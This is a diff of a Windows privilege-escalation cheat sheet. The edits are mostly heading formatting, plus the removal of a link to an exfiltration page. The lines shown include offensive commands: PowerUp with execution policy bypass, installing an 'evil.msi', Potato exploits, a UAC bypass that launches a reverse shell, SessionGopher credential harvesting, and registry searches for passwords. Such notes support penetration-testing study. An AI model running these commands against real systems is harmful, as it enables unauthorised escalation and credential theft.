@@ -14,7 +14,7 @@ https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/
 https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
 https://atom.hackstreetboys.ph/windows-privilege-escalation-service-exploits/
 
-**Tools**
+### Tools
 
 `powershell.exe -ex bypass -c Import-Module .\powerup.ps1; Invoke-AllChecks`
 
@@ -22,7 +22,8 @@ https://atom.hackstreetboys.ph/windows-privilege-escalation-service-exploits/
 
 ---
 
-**Weak Service Permissions**
+### Weak Service Permissions
+
 _It is very often in Windows environments to discover services that run with SYSTEM privileges and they don’t have the appropriate permissions set by the administrator. This means that either the user has permissions over the service or over the folder of where the binary of the service is stored or even worse both._
 
 - Upload _accesschk.exe_ to a writable directory first. For XP SP0, version 5.2 of _accesschk.exe_ is needed.
@@ -67,7 +68,8 @@ sc start "Service Name"
 
 ---
 
-**Executable file**
+### Executable file
+
 Here we are looking for executable files associace with a service that we can overwrite.
 
 - Find the files where we have write permission
@@ -86,7 +88,8 @@ wmic service name,pathname | findstr <name_service.exe>
 
 ---
 
-**Schedule Task**
+### Schedule Task
+
 _Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite._
 
 - List all the tasks
@@ -110,7 +113,7 @@ schtasks /RUN /TN "Task Name"
 
 ---
 
-**Insecure Service Registry Permissions**
+### Insecure Service Registry Permissions
 
 - Find writable registry keys for services using Accesschk.
 
@@ -153,7 +156,8 @@ sc start "SomeSoftwareName"
 
 ---
 
-**DLL Hijacking**
+### DLL Hijacking
+
 In Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly. If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file.
 
 - Find missing DLL
@@ -173,7 +177,8 @@ icacls <path dll>
 
 ---
 
-**AlwaysInstallElevated**
+### AlwaysInstallElevated
+
 _AlwaysInstallElevated is functionality that offers all users (especially the low privileged user) on a windows machine to run any MSI file with elevated privileges._
 
 - Check if these 2 registry value is 1.
@@ -199,7 +204,8 @@ msiexec /quiet /qn /i C:\evil.msi
 
 ---
 
-**Unquoted paths**
+### Unquoted paths
+
 _If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges_
 
 - For example, the following path would be vulnerable:
@@ -223,7 +229,8 @@ wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr
 
 ---
 
-**Hot Potato**
+### Hot Potato
+
 _NBNS spoofing + NTLM relay + implementation of a fake WPAD proxy server which is running locally on the target host_
 
 - Command to add user to admin group:
@@ -234,7 +241,8 @@ powershell.exe -ep bypass -c Import-Module ./Tater.ps1; Invoke-Tater -Trigger 1 
 
 ---
 
-**Jucy Potato**
+### Jucy Potato
+
 _When you have SeImpersonate or SeAssignPrimaryToken privileges_
 
 ```pwsh
@@ -249,7 +257,7 @@ tanter.exe <user name>
 
 ---
 
-**UAC Bypass**
+### UAC Bypass
 
 ```pwsh
 akagi32 <Key> <executable file>
@@ -261,7 +269,7 @@ akagi32 10 c:\windows\system32\reverse_shell.exe
 
 ---
 
-**Saved session information (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)**
+### Saved session information (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
 
 ```pwsh
 powershell.exe -ep bypass -c Import-Module SessionGopher.ps1; Invoke-SessionGopher -Thorough
@@ -273,13 +281,13 @@ SessionGopher.exe
 
 ---
 
-**Exploit user privileges**
+### Exploit user privileges
 
 https://github.com/gtworek/Priv2Admin
 
 ---
 
-**ClearText passwords**
+### ClearText passwords
 
 - Find all passwords in all files
 
@@ -356,13 +364,13 @@ reg query HKCU /f password /t REG_SZ /s
 
 ---
 
-**Escalate to SYSTEM from Administrator**
+### Escalate to SYSTEM from Administrator
 
 ```pwsh
 psexec -i -s cmd.exe /accepteula
 ```
 
-**Kernel exploit**
+### Kernel exploit
 
 - python windows exploit suggester using systeminfo output
 
@@ -379,9 +387,3 @@ https://github.com/abatchy17/WindowsExploits
 ```
 
 ---
-
-**Exfiltration file**
-
-```pwsh
-https://book.hacktricks.xyz/exfiltration
-```
